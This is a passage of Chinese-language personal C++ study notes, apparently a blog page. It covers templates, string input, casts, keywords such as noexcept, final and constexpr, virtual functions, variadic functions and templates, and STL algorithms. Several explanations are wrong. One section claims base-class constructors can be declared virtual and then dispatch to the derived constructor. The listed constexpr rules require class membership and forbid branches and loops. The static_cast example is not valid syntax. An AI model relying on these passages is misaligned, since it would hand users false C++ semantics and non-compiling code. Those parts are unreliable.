class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Type_1,<span class="hljs-keyword">typename</span> Type_2&gt;<br><span class="hljs-function"><span class="hljs-type">void</span>  <span class="hljs-title">Cout</span><span class="hljs-params">(Type_1 a=<span class="hljs-number">0</span>,Type_2 b=<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cout&lt;&lt;<span class="hljs-string">&quot;a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Cout</span>&lt;<span class="hljs-type">char</span>*,string&gt;(<span class="hljs-string">&quot;char*&quot;</span>,<span class="hljs-string">&quot;string&quot;</span>);<br><span class="hljs-comment">/*    cout&lt;&lt;add&lt;int,int&gt;(a,b)&lt;&lt;endl;</span><br><span class="hljs-comment">    cout&lt;&lt;add&lt;int&gt;(a,b)&lt;&lt;endl;</span><br><span class="hljs-comment">    cout&lt;&lt;add&lt;&gt;(a,b)&lt;&lt;endl;*/</span><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221211212205234.png" alt="image-20221211212205234"></p></li><li><p>c++中读取字符串的函数</p><ul><li><p><code>getline()</code>     <code>string类</code></p><p>运行结果：</p><p><img src="C:\Users\12414\Desktop\学\笔记\c++\平常笔记.assets\平常笔记.assets\image-20221227225137590.png" alt="image-20221227225137590"></p></li><li><p><code>cin.getline()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">cin</span>.getline(str, <span class="hljs-number">20</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">//cin.getline()里面三个参数，第一个是要储存的字符串数组，第二个是最大长度 + 1，最后一个位置用来存储&#x27;\0&#x27;，也就是说你填20，但是只能存前19个字符，第三个是结束符，可省略，默认是换行符</span><br></code></pre></td></tr></table></figure><p>当第二个参数大于数组本身的长度时，只会读取数组这么长</p></li></ul></li><li><p>使用指针遍历时，不能使用数组名，必须重新创建一个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">0</span>&#125;,*P=arr;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">6</span>;i++)<br>        <span class="hljs-built_in">cin</span>&gt;&gt;arr[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">6</span>;i&gt;<span class="hljs-number">0</span>;--i)<br>    &#123;<br>        <span class="hljs-built_in">cout</span>&lt;&lt;*P++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>字符串的输入</p><ul><li><p>string类</p><p>使用<code>getline(cin,string名称)</code></p></li><li><p>字符数组类</p><p>使用<code>cin.getline(str,sizeof(str))</code>;</p></li></ul></li><li><p>c++的强制类型转换方式</p><p>使用<code>static_cast&lt;强制传换成的类型&gt;(被转变量名)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a =<span class="hljs-number">2</span>;<br><span class="hljs-type">short</span> b=<span class="hljs-number">3</span>;<br>b=<span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;a;<br></code></pre></td></tr></table></figure></li><li><p><code>using</code>的三个用处</p><ul><li><p>引入命名空间</p></li><li><p>指定别名</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> ModuleType = ClassOne;<br></code></pre></td></tr></table></figure></li><li><p>在子类中引入基类的成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> ClassType::ModuleType;<br><br></code></pre></td></tr></table></figure></li></ul></li><li><p><code>noexcept</code>关键字的使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ThreadEntry</span><span class="hljs-params">()</span> <span class="hljs-keyword">noexcept</span></span>;<br></code></pre></td></tr></table></figure></li><li><p><code>default</code>是c++11的标准，它的作用是告诉编译器声明一个无参的默认构造函数</p><ul><li>与手动写的无参构造有什么区别<ul><li>多文件的编程中，使用<code>default</code>声明的不需要再写实现</li><li>代码执行的效率很高</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>&#123;<br>    <br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-built_in">test</span>() = <span class="hljs-keyword">default</span>;<br>        <span class="hljs-built_in">test</span>(<span class="hljs-type">int</span> a)&#123;&#125;<br>        <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span>&#123;&#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><code>explict</code>这个关键字的作用是用于修饰只有一个参数的构造函数，并要求为显示的，也就是防止用户做可能会发生隐式转换的事情，会报错</p></li><li><p><code>noexcept</code>这是c++11增加的函数，目的是为了提升函数效率，即告诉编译器这个函数不会产生异常。</p></li><li><p><code>=delete</code>表示不能被调用</p></li><li><p><code>decltype </code></p><p><code>auto</code>根据<code>=</code>右边的初始值 <code>value</code> 推导出变量的类型，而 <code>decltype</code> 根据 <code>exp</code> 表达式推导出变量的类型，跟<code>=</code>右边的 <code>value</code> 没有关系。</p></li><li><p><code>lambda</code>表达式</p><p>[见这个](<a href="https://tsy244.github.io/2023/03/26/lambda%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8/">lambda高级使用 - chg (tsy244.github.io)</a>)</p></li><li><p>c++ 父类构造函数声明<code>vitual</code>的作用</p><p>在C++中，当我们派生一个子类时，子类的构造函数会默认调用父类的构造函数以初始化父类的成员变量。而在某些情况下，我们希望能够在父类的构造函数中调用子类重写的虚函数，此时就需要在父类的构造函数声明为<code>virtual</code>。</p><p>具体来说，当父类的构造函数声明为<code>virtual</code>时，如果我们通过子类的指针或引用调用这个构造函数，那么实际被调用的将是子类的构造函数，而不是父类的构造函数。这样可以保证在父类中调用子类的虚函数时，已经完成了子类对象的初始化，避免出现未定义行为的情况。</p><p>需要注意的是，对于同一对象，构造函数的调用顺序是按照继承层次由上至下的，也就是从基类到派生类。因此，在子类的构造函数中，父类的构造函数已经执行完毕，可以调用虚函数，无需再将父类的构造函数声明为<code>virtual</code>。</p></li><li><p>c++父类里使用<code>vitual</code>的函数子类还会继承嘛？</p><p>在 C++ 中，如果一个父类声明了一个虚函数，那么子类继承这个虚函数并且在子类中可以进行重写（override）。当然，如果子类不想重写这个虚函数，也可以直接继承父类中的实现。</p><p>需要注意的是，在父类的构造函数中调用虚函数时，子类的版本不会被调用。这是因为在子类的构造函数执行之前，父类的构造函数已经执行完毕了，此时子类还没有初始化完成。如果在父类的构造函数中调用子类的函数，就有可能出现未定义行为的情况，因此编译器会强制执行父类版本的虚函数。</p><p>总之，如果一个虚函数在父类中已经声明，子类无论是否重写它，在概念上都是继承了这个虚函数，即子类对象拥有这个虚函数的 vtable（虚函数表） 和 vptr（虚指针），可以通过指针或引用来使用这个虚函数。</p></li><li><p>在使用多态的时候应该将父类的析构函数声明<code>vitrual</code></p></li><li><p>在使用<code>virtual</code>的时候体积的增大，是因为携带了很多信息，如虚函数表，虚指针</p></li><li><p>纯虚函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">testFunc</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>含有纯虚函数的class不能声明的对象，只能被派生</p></li><li><p>在初始化列表中调用父类的构造函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">son</span>:<span class="hljs-keyword">public</span> fat &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">son</span>();<br><br>    ~<span class="hljs-built_in">son</span>();<br>&#125;;<br><br><span class="hljs-comment">//构造</span><br>son::<span class="hljs-built_in">son</span>(): <span class="hljs-built_in">fat</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;son::son()&quot;</span> &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>move()</code>的使用</p><p>于在不进行复制或赋值操作的情况下将对象的所有权从一个对象转移到另一个对象。通过使用move，可以避免对资源进行复制和销毁的昂贵开销，从而提高代码效率。</p><p>在构造函数中可以使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">fat::<span class="hljs-built_in">fat</span>(std::string str):<span class="hljs-built_in">str</span>(std::<span class="hljs-built_in">move</span>(str)) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;name::name()&quot;</span> &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>final</code>关键字的使用</p><ul><li>在类上面的使用</li></ul><p>  类的声明中使用final关键字，可以指示该类不能被继承</p><ul><li><p>在虚函数上面的使用</p><p>在虚函数的声明中使用final关键字，可以阻止子类对该虚函数进行覆盖</p></li></ul><p>需要注意的是，final关键字只能用于类或虚函数的声明中，而不能用于变量、函数或其它类型的声明中。</p></li><li><p><code>const</code>和<code>constexpr</code></p><ul><li><p><code>const</code> 只是将变量标记为“只读”，并非编译期常量，而 <code>constexpr</code> 则需要在编译时求值，生成编译期常量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">const</span> <span class="hljs-type">int</span> constInt=<span class="hljs-number">10</span>;<span class="hljs-comment">//只读</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">int</span> constNum=<span class="hljs-number">10</span>;<span class="hljs-comment">//编译期常量</span><br></code></pre></td></tr></table></figure></li><li><p>被声明为 <code>constexpr</code> 的变量或函数，必须要满足编译器的常量表达式要求，可以在编译时进行求值。</p></li><li><p><code>constexpr</code> 变量应该使用特定的类型，如整数类型、枚举类型以及一些简单的浮点类型。</p></li><li><p><code>constexpr</code> 函数具有与普通函数类似的语法，但是其参数和返回值类型也必须是可求值的。在调用 <code>constexpr</code> 函数时，所有参数必须是编译期常量。</p></li></ul></li><li><p><code>const</code>修饰函数</p><p>在C++中，<code>const</code> 关键字可以作用于成员函数、非成员函数、指针和引用等对象上。如果将 <code>const</code> 应用于成员函数，则该函数被视为只读函数（read-only function），即在该函数内不能修改成员变量的值，也不能调用非<code> const</code> 成员函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">fat::test</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-comment">//</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure></li><li><p><code>constexpr</code>修饰函数</p><ol><li>函数必须是类的一部分；</li><li>函数有返回类型，而且返回类型必须为字面值类型；</li><li>函数体中只能包含诸如 <code>return</code>、<code>static_assert</code> 和 <code>typedef</code> 等语句，不能有分支语句（例如 <code>if</code>、<code>while</code>）和循环语句（例如 <code>for</code>、<code>do-while</code>）；</li><li>函数的参数列表中只能有字面值类型、引用和指针，而且参数都必须是 <code>constexpr</code> 的；</li><li>将函数声明为 <code>constexpr</code> 时，函数体内的所有函数调用都必须是 <code>constexpr</code> 的，这也意味着被调用的函数必须是 <code>constexpr</code> 的。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-type">void</span> <span class="hljs-title">fat::test</span><span class="hljs-params">()</span> </span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>void(*)(int,int)</code>和<code>void(int,int)</code>区别</p><p>一个是函数指针，一个是函数</p></li><li><p>显示和隐式转换</p><p>隐式转换和显示转换是类型转换中的两种方式，其中隐式转换是指在代码中转换类型时，不需要明确地指定要进行类型转换，而是根据上下文环境自动进行转换。相反地，显示转换则是指需要明确地在代码中使用强制类型转换的语法来将一种类型转换为另一种类型。</p><p>隐式转换通常是由编译器自动完成的，它允许代码更简洁、更易读和更容易维护。例如，当一个整数值被分配给一个接收实数的变量时，编译器会自动将整数隐式转换为实数。</p><p>与此相反，显示转换则需要在代码中使用强制类型转换的语法（例如“（int）x”）来明确告诉编译器我们要将某个值转换为另一种类型。在有些情况下，显示转换是非常必要的，例如当我们需要将浮点数转换为整数时，需要使用显示转换来避免数据精度丢失。</p></li><li><p>将c++的string转变为c的string</p><p>使用string的<code>c_str()</code>函数</p></li><li><p>在C++中，可以使用std::reverse()函数来翻转一个序列中的元素。该函数定义在<algorithm>头文件中，其语法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">BidirectionalIterator</span>&gt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverse</span> <span class="hljs-params">(BidirectionalIterator first, BidirectionalIterator last)</span></span>;<br></code></pre></td></tr></table></figure></li><li><p><code>find()</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> it = <span class="hljs-built_in">find</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), value);<br></code></pre></td></tr></table></figure></li><li><p>c++的可变列表</p><p>注意头文件<code>&lt;cstdarg&gt;</code></p><p><code>va_list</code>、<code>va_start</code>、<code>va_arg</code>、<code>va_copy</code>和<code>va_end</code>（end是清楚之前的参数列表）等预定义宏</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdarg&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> count,...)</span>-&gt; <span class="hljs-title">decltype</span><span class="hljs-params">(count)</span></span>&#123;<br>    va_list args;<br>    <span class="hljs-built_in">va_start</span>(args,count);<br>    <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; ++i) &#123;<br>        sum+= <span class="hljs-built_in">va_arg</span>(args,<span class="hljs-type">int</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">func</span>(<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>以下部分代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdarg&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format, ...)</span> </span>&#123;<br>    va_list args;<br>    <span class="hljs-built_in">va_start</span>(args, format);<br><br>    <span class="hljs-keyword">while</span> (*format != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (*format == <span class="hljs-string">&#x27;d&#x27;</span>) &#123;<br>            <span class="hljs-type">int</span> value = <span class="hljs-built_in">va_arg</span>(args, <span class="hljs-type">int</span>);<br>            cout &lt;&lt; value &lt;&lt; endl;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*format == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;<br>            <span class="hljs-type">double</span> value = <span class="hljs-built_in">va_arg</span>(args, <span class="hljs-type">double</span>);<br>            cout &lt;&lt; value &lt;&lt; endl;<br>        &#125;<br>        ++format;<br>    &#125;<br><br>    <span class="hljs-built_in">va_end</span>(args);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;df&quot;</span>, <span class="hljs-number">123</span>, <span class="hljs-number">3.14</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>可变参数模板</p><ul><li><p>要么重载函数</p><p>要么通过方法，在最后直接返回</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function">T <span class="hljs-title">func2</span><span class="hljs-params">(T value)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T,<span class="hljs-keyword">typename</span> ...Args&gt;</span><br><span class="hljs-function">T <span class="hljs-title">func2</span><span class="hljs-params">(T value,Args...args)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> value+ <span class="hljs-built_in">func2</span>(args...);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">func2</span>(<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2.3</span>,<span class="hljs-number">4.6</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure></li><li><p>使用<code>auto</code>接纳引用，我们需要手动添加<code>&amp;</code></p></li><li><p>部分现遇的<code>STL</code>算法函数</p><ol><li>查找：find、find_if、find_end、find_first_of、adjacent_find、count、count_if</li><li>排序：sort、stable_sort、partial_sort、nth_element、make_heap、sort_heap</li><li>操作：copy、copy_n、move、swap、swap_ranges、transform、fill、generate、replace、remove、unique、reverse</li><li>数值：accumulate、inner_product、partial_sum、adjacent_difference、iota</li><li>集合操作：set_union、set_intersection、set_difference、merge、includes</li><li>通用算法：for_each、min、max、minmax、clamp、equal、lexicographical_compare、next_permutation、prev_permutation、rotate</li></ol></li><li><p>关于48部分函数的解释</p><ul><li><code>find()</code>查找该值在容器中是否存在</li><li><code>count()</code>计算容器中该<code>value</code>的数量</li><li><code>sort()</code>对容器内的元素排序的函数</li><li><code>copy()</code>对容器的拷贝</li><li><code>transform()</code> 将原来容器的数据导入到现在这个容器当中</li><li><code>fill()</code>它可以将一个容器中的所有元素设置为指定的值</li><li><code>generate()</code>它可以使用指定的函数对象生成容器中的元素。它通常用于初始化容器或将容器重置为特定值</li><li><code>replace()</code> replace函数是C++ STL中的一个函数，它可以将容器中的所有指定值替换为另一个值。它通常用于将容器中的特定元素替换为其他元素。</li><li><code>remove()</code> 选择一个元素移到最后面</li><li><code>unique()</code> 使得只有一个元素</li><li><code>reverse()</code>  它可以将容器中的元素反转。它通常用于反转容器中的元素顺序。</li><li><code>iota()</code> 它可以将指定的值序列填充到容器中。它通常用于初始化容器中的元素。</li><li><code>merge()</code> 它可以将两个已排序的容器合并为一个已排序的容器。它通常用于对已排序的容器进行合并操作。</li><li><code>includes()</code> 它可以判断一个容器是否包含另一个容器中的所有元素。它通常用于判断一个容器是否包含另一个容器。</li><li><code>for_each()</code> 它可以对容器中的每个元素执行指定的操作。它通常用于对容器中的元素进行遍历操作。</li><li><code>rotate</code> 它可以将容器中的元素旋转到指定的位置。它通常用于对容器中的元素进行旋转操作。</li></ul></li><li><p><code>namespace</code></p><ul><li><p>简绍</p><p><img src="https://cpp-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/namespace%E7%9A%84%E7%AE%80%E7%BB%8D.jpg"></p></li><li><p>可以嵌套 ，还用<code>inline</code>相当于突破外部 空间的限制</p></li></ul></li><li><p>为什么C语言里卖弄没有重载？</p><p><img src="https://cpp-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/%E4%B8%BA%E4%BB%80%E4%B9%88C%E8%AF%AD%E8%A8%80%E9%87%8C%E9%9D%A2%E6%B2%A1%E6%9C%89%E9%87%8D%E8%BD%BD.jpg"></p></li><li><p>指针与引用的不同的</p><p><img src="https://cpp-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/%E6%8C%87%E9%92%88%E4%B8%8E%E5%BC%95%E7%94%A8%E7%9A%84%E4%B8%8D%E5%90%8C.png"></p></li><li><p>多使用<code>override</code>,<code>final</code>和<code>delete</code>关键字</p></li><li><p>可以在返回值处写<code>auto</code>关键字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T1,<span class="hljs-keyword">typename</span> T2,<span class="hljs-keyword">typename</span> T3&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add</span><span class="hljs-params">(T1 a,T2 b,T3 c)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b+c;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span>  a+b;<br>&#125;<br>    <br>    <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5.8</span>,<span class="hljs-number">-8</span>)&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">-9</span>)&lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure></li><li><p>使用可变参数模板进行add操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> ...Args&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add</span><span class="hljs-params">(Args...args)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> (args + ...);<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5.8</span>,<span class="hljs-number">-8</span>)&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">-9</span>)&lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure></li><li><p>当对<code>vector</code>使用<code>clear</code>后，将不再有<code>vector</code></p></li><li><p><code>.o</code>文件是已经编译完成的文件，这个阶段会发生未声明错误</p><p>如果是未定义，则是发生在链接阶段</p></li><li><p>字符串的初始化有很多形式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    string str1&#123;<span class="hljs-string">&quot;i&#x27;m august&quot;</span>&#125;;<br>    string str2&#123;<span class="hljs-string">&quot;hello,world&quot;</span>,<span class="hljs-number">5</span>&#125;;<br>    string str3&#123;str2,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>&#125;;<br>    <br>    <span class="hljs-keyword">return</span> <span 